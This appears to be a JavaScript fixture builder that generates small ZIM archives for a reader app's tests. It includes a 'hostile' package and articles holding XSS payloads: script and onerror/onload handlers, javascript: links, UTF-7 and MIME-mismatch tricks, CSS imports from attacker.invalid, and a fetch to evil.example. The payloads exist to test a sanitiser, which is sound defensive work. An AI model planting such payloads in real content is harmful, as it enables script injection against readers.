// Generates the small fixture ZIM files used by the Phase 8 tests (tasks Z-01 to Z-09) with the libzim `Creator` API.
// All content below is written for this project and is licensed AGPL-3.0-only like the rest of the repository. No ZIM is downloaded.
//
//   node tests/fixtures/zim/build.mjs [outDir]
//
// Produces in outDir (default tests/fixtures/zim/.cache):
//   chem.zim       new namespace scheme, full-text index, title index, images, CSS, a script, links between entries, redirects
//   notitle.zim    no full-text index (title-suggestion fallback), otherwise like chem.zim but tiny
//   wiki.zim       looks like a Wikipedia build (name wikipedia_en_fixture, articles keyed by title, source en.wikipedia.org)
//   bad.zim        not a ZIM file (corrupt header), to prove validation
// The files are reproducible apart from the creation timestamp; the UUIDs are fixed so tests can assert on them.
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import { createRequire } from "node:module";

const here = path.dirname(fileURLToPath(import.meta.url));

async function loadLibzim() {
  // @openzim/libzim is a dependency of apps/server, so resolve it from there.
  const req = createRequire(path.resolve(here, "../../../apps/server/package.json"));
  return await import(req.resolve("@openzim/libzim"));
}

const page = (title, body, extra = "") =>
  `<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><title>${title}</title><link rel="stylesheet" href="-/style.css">${extra}</head><body><h1>${title}</h1>${body}</body></html>`;

// libzim wants exactly 16 raw bytes; archive.uuid prints them as dashed hex.
const rawUuid = (s) => Buffer.from(s, "latin1");
const hexUuid = (s) => { const h = rawUuid(s).toString("hex"); return `${h.slice(0, 8)}-${h.slice(8, 12)}-${h.slice(12, 16)}-${h.slice(16, 20)}-${h.slice(20)}`; };
export const CHEM_UUID = hexUuid("ncb-fixture-chem");
export const NOTITLE_UUID = hexUuid("ncb-fixture-note");
export const OTHER_UUID = hexUuid("ncb-fixture-cuis");
export const BIG_UUID = hexUuid("ncb-fixture-bigg");
export const WIKI_UUID = hexUuid("ncb-fixture-wiki");
export const HOSTILE_UUID = hexUuid("ncb-fixture-host");
const RAW = { [CHEM_UUID]: "ncb-fixture-chem", [NOTITLE_UUID]: "ncb-fixture-note", [OTHER_UUID]: "ncb-fixture-cuis", [BIG_UUID]: "ncb-fixture-bigg", [WIKI_UUID]: "ncb-fixture-wiki", [HOSTILE_UUID]: "ncb-fixture-host" };

/**
 * Snippet payload. libzim strips real tags when it builds a snippet, but text that was written as escaped markup comes back as live
 * markup in the snippet, so this is what a hostile ZIM would do. The search sanitiser must neutralise it.
 */
export const XSS_TEXT = `The <b>xyzzy</b> compound is <img src=x onerror="alert(1)"> dangerous <script>alert('xss')</script> <a href="javascript:alert(2)">click</a> indeed.`;
const escapeHtml = (t) => t.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
export const XSS_BODY = escapeHtml(XSS_TEXT);

const PNG_1x1 = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8BQDwAEhQGAhKmMIQAAAABJRU5ErkJggg==", "base64");

/** [path, title, bodyHtml] */
const CHEM_ARTICLES = [
  ["Benzene", "Benzene", `<p>Benzene is an aromatic ring hydrocarbon with formula C6H6. See <a href="Aromaticity">aromaticity</a> and <a href="Toluene">toluene</a>.</p><p><img src="I/benzene.png" alt="benzene ring"></p><p>External: <a href="https://en.wikipedia.org/wiki/Benzene">Wikipedia</a>. Missing: <a href="Nonexistent_article">a gap</a>.</p><script>document.title='pwned'; fetch('https://evil.example/x')</script><p onclick="alert(1)">Click me</p>`],
  ["Aromaticity", "Aromaticity", `<p>Aromaticity describes the stability of a ring with delocalised electrons, as in <a href="Benzene">benzene</a>. The aromatic ring is planar.</p>`],
  ["Toluene", "Toluene", `<p>Toluene is methylbenzene, an aromatic solvent. It is related to <a href="Benzene">benzene</a>. Aromatic ring chemistry applies.</p>`],
  ["Water", "Water", `<p>Water is H2O. It is not aromatic at all.</p>`],
  ["Ethanol", "Ethanol", `<p>Ethanol is a simple alcohol, C2H5OH.</p>`],
  ["Xyzzy_compound", "Xyzzy compound", `<p>${XSS_BODY}</p>`],
  ["Methane", "Methane", `<p>Methane is the simplest alkane hydrocarbon, CH4.</p>`],
  ["Ethane", "Ethane", `<p>Ethane is an alkane hydrocarbon, C2H6.</p>`],
  ["Propane", "Propane", `<p>Propane is an alkane hydrocarbon, C3H8, used as fuel.</p>`],
  ["Butane", "Butane", `<p>Butane is an alkane hydrocarbon, C4H10.</p>`],
  ["Pentane", "Pentane", `<p>Pentane is an alkane hydrocarbon, C5H12.</p>`],
  ["Zeolite", "Zeolite", `<p>Zeolite is a microporous aluminosilicate mineral.</p>`],
];

/**
 * A small package that looks like a Kiwix Wikipedia build (task Z-06): named `wikipedia_en_fixture`, English, articles keyed by their Wikipedia title
 * (`Benzene`, `Black_hole`), a redirect, and links between articles. Text is written for this project; the licence is stated as CC BY-SA 4.0 like a real one.
 */
const WIKI_ARTICLES = [
  ["Benzene", "Benzene", `<p><b>Benzene</b> is an aromatic hydrocarbon with the formula C6H6. See <a href="Toluene">toluene</a>, <a href="Aromaticity">aromaticity</a> and <a href="Moon">the Moon</a>.</p><p>Elsewhere: <a href="https://en.wikipedia.org/wiki/Zirconium">Zirconium</a> is not in this package. This copy is the package copy.</p><img src="I/benzene.png" alt="ring">`],
  ["Toluene", "Toluene", `<p><b>Toluene</b> is methylbenzene, an aromatic solvent related to <a href="Benzene">benzene</a>.</p>`],
  ["Aromaticity", "Aromaticity", `<p><b>Aromaticity</b> describes the stability of a ring with delocalised electrons, as in <a href="Benzene">benzene</a>.</p>`],
  ["Moon", "Moon", `<p>The <b>Moon</b> is Earth's only natural satellite. It orbits the <a href="Sun">Sun</a> with the Earth.</p>`],
  ["Sun", "Sun", `<p>The <b>Sun</b> is the star at the centre of the Solar System.</p>`],
  ["Black_hole", "Black hole", `<p>A <b>black hole</b> is a region of spacetime where gravity is so strong that nothing escapes.</p>`],
];

export async function buildZim(file, { uuid, title, fulltext, articles, language = "eng", flavour = "maxi", extraMeta = {}, redirects = true, extraItems = [] }) {
  const { Creator, StringItem, Compression } = await loadLibzim();
  fs.rmSync(file, { force: true });
  const creator = new Creator().configNbWorkers(1).configClusterSize(16 * 1024).configIndexing(fulltext, language).configCompression(Compression.Zstd);
  creator.startZimCreation(file);
  creator.setUuid(RAW[uuid]);
  const mk = (p, mime, t, content, front = false) => new StringItem(p, mime, t, { FRONT_ARTICLE: front ? 1 : 0 }, content);
  for (const [p, t, body] of articles) await creator.addItem(mk(p, "text/html", t, page(t, body), true));
  await creator.addItem(mk("-/style.css", "text/css", "style", "body{font-family:sans-serif} h1{color:#036} .hidden{display:none}"));
  for (const [p, mime, t, content] of extraItems) await creator.addItem(mk(p, mime, t, content));
  await creator.addItem(mk("I/benzene.png", "image/png", "benzene.png", PNG_1x1));
  await creator.addItem(mk("-/app.js", "application/javascript", "app", "document.body.setAttribute('data-js','ran')"));
  if (redirects) creator.addRedirection("Methylbenzene", "Methylbenzene", "Toluene", { FRONT_ARTICLE: 0 });
  const main = articles[0][0];
  creator.addRedirection("mainpage", "Main page", main, { FRONT_ARTICLE: 1 });
  creator.setMainPath("mainpage");
  const meta = {
    Name: path.basename(file, ".zim"), Title: title, Description: `Fixture ZIM for NoConBrain tests (${title}).`, Language: language, Creator: "NoConBrain tests",
    Publisher: "NoConBrain", Date: "2026-11-01", Flavour: flavour, Tags: `_category:test;${fulltext ? "_ftindex:yes" : "_ftindex:no"};_pictures:yes`,
    Source: "https://example.invalid/noconbrain-fixture", License: "CC BY-SA 4.0", Scraper: "noconbrain-fixture-builder", ...extraMeta,
  };
  for (const [k, v] of Object.entries(meta)) creator.addMetadata(k, v);
  
  await creator.finishZimCreation();
}

/**
 * A package made to attack the reader (H-03): one article per vector given, entries whose declared type disagrees with their bytes, script, SVG and
 * XHTML entries, a style sheet with imports, and metadata (title, creator, licence, source) that is markup. `vectors` is a list of { name, html }.
 */
export async function buildHostileZim(file, vectors) {
  const articles = vectors.map((v, i) => [`V${i}`, `Vector ${i}`, v.html]);
  articles.unshift(["Hostile_start", "Hostile start", `<p>Start of the hostile package. xyzzyhostile</p>`]);
  const A = "alert(1)";
  const extraItems = [
    ["A/svg.svg", "image/svg+xml", "svg", `<svg xmlns="http://www.w3.org/2000/svg" onload="${A}"><script>${A}</script><a href="javascript:${A}"><text>x</text></a><image href="http://attacker.invalid/a.png"/></svg>`],
    ["A/doc.xhtml", "application/xhtml+xml", "xhtml", `<html xmlns="http://www.w3.org/1999/xhtml"><body onload="${A}"><script>${A}</script><p>xhtml</p></body></html>`],
    ["A/xml.xml", "text/xml", "xml", `<?xml version="1.0"?><root><x:script xmlns:x="http://www.w3.org/1999/xhtml">${A}</x:script></root>`],
    ["A/js.js", "text/javascript", "js", `${A}`],
    ["A/plain.txt", "text/plain", "plain", `<script>${A}</script><img src=x onerror=${A}>`],
    ["A/html-as-png", "image/png", "htmlpng", `<html><body onload="${A}"><script>${A}</script></body></html>`],
    ["A/html-as-octet", "application/octet-stream", "htmloct", `<html><body onload="${A}"><script>${A}</script></body></html>`],
    ["A/no-type", "", "notype", `<html><body onload="${A}"><script>${A}</script></body></html>`],
    ["A/utf7.html", "text/html; charset=utf-7", "utf7", `+ADw-script+AD4-alert(1)+ADw-/script+AD4-`],
    ["A/html-params", "text/html;charset=ISO-2022-JP", "htmlparams", `<script>${A}</script><p>x</p>`],
    ["A/css.css", "text/css", "css", `@import url("http://attacker.invalid/x.css"); body{background:url(http://attacker.invalid/a.png);behavior:url(x.htc);-moz-binding:url(http://attacker.invalid/x.xml#y)} a{background:expression(${A})}`],
    ["A/mhtml", "multipart/related", "mhtml", `Content-Type: text/html\r\n\r\n<script>${A}</script>`],
    ["A/pdf.pdf", "application/pdf", "pdf", `%PDF-1.4 <script>${A}</script>`],
    ["A/swf", "application/x-shockwave-flash", "swf", `CWS`],
  ];
  await buildZim(file, {
    uuid: HOSTILE_UUID, title: `<img src=x onerror="${A}">Hostile <script>${A}</script>`, fulltext: true, articles, extraItems, redirects: false,
    extraMeta: {
      Creator: `<script>${A}</script>`, Publisher: `"><img src=x onerror=${A}>`, Description: `<svg onload=${A}>`,
      License: `"><script>${A}</script>`, Source: `javascript:${A}`, Name: "hostile",
    },
  });
}

/** Builds every fixture into `outDir` (skipping files that already exist unless `force`). Returns their paths. */
export async function buildFixtures(outDir = path.join(here, ".cache"), { force = false } = {}) {
  fs.mkdirSync(outDir, { recursive: true });
  const out = { wiki: path.join(outDir, "wiki.zim"), big: path.join(outDir, "big.zim"), chem: path.join(outDir, "chem.zim"), notitle: path.join(outDir, "notitle.zim"), other: path.join(outDir, "other.zim"), bad: path.join(outDir, "bad.zim") };
  if (force || !fs.existsSync(out.chem)) await buildZim(out.chem, { uuid: CHEM_UUID, title: "Chemistry (fixture)", fulltext: true, articles: CHEM_ARTICLES });
  if (force || !fs.existsSync(out.notitle)) {
    await buildZim(out.notitle, {
      uuid: NOTITLE_UUID, title: "Notes without a full-text index", fulltext: false, flavour: "nopic", language: "eng",
      redirects: false, articles: [["Aromatic_notes", "Aromatic notes", `<p>Notes about aromatic rings, but nothing indexes this text.</p>`], ["Alkane_notes", "Alkane notes", `<p>Alkanes are saturated.</p>`]],
    });
  }
  if (force || !fs.existsSync(out.other)) {
    await buildZim(out.other, {
      uuid: OTHER_UUID, title: "Cuisine (fixture)", fulltext: true, language: "fra", flavour: "mini",
      redirects: false, articles: [["Pain", "Pain", `<p>Le pain est une aromatic base de la cuisine.</p>`], ["Fromage", "Fromage", `<p>Le fromage est fait de lait.</p>`]],
    });
  }
  if (force || !fs.existsSync(out.big)) {
    // About 24 MiB of incompressible media in a few articles: proves that registering a package reads in place and extracts nothing.
    const { randomBytes } = await import("node:crypto");
    await buildZim(out.big, {
      uuid: BIG_UUID, title: "Large package (fixture)", fulltext: false, flavour: "maxi", redirects: false,
      articles: [["Big_article", "Big article", `<p>Large package.</p><img src="I/blob0.bin">`]],
      extraItems: Array.from({ length: 6 }, (_, i) => [`I/blob${i}.bin`, "application/octet-stream", `blob${i}`, randomBytes(4 * 1024 * 1024)]),
    });
  }
  if (force || !fs.existsSync(out.wiki)) {
    await buildZim(out.wiki, {
      uuid: WIKI_UUID, title: "Wikipedia (fixture)", fulltext: true, language: "eng", flavour: "mini", articles: WIKI_ARTICLES,
      extraMeta: { Creator: "Wikipedia", Publisher: "Wikimedia", Source: "https://en.wikipedia.org", Description: "Fixture package that looks like a Wikipedia build." },
    });
  }
  if (force || !fs.existsSync(out.bad)) fs.writeFileSync(out.bad, Buffer.concat([Buffer.from("not a zim file at all"), Buffer.alloc(4096, 7)]));
  return out;
}

if (process.argv[1] === fileURLToPath(import.meta.url)) {
  const dir = process.argv[2] ? path.resolve(process.argv[2]) : undefined;
  const out = await buildFixtures(dir, { force: true });
  for (const [k, v] of Object.entries(out)) console.log(k, v, fs.statSync(v).size, "bytes");
}
